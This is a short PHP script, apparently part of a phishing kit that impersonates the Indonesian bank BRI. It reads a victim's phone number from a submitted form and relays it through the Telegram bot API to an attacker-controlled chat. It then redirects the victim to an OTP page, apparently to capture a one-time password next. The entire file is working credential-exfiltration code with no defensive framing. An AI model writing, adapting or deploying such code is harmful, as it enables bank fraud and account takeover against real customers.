<?php 



session_start();
include "./telegram.php";



$message = "❁┷━❃𝗕𝗥𝗜.𝗖𝗢.𝗜𝗗❃━┷❁". "\n༺𝗧𝗶𝗱𝗮𝗸 𝗣𝘂𝗻𝘆𝗮 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁༻"."\n\n𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :\n".  $_POST ['phone'];

function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  otp.html");
?> 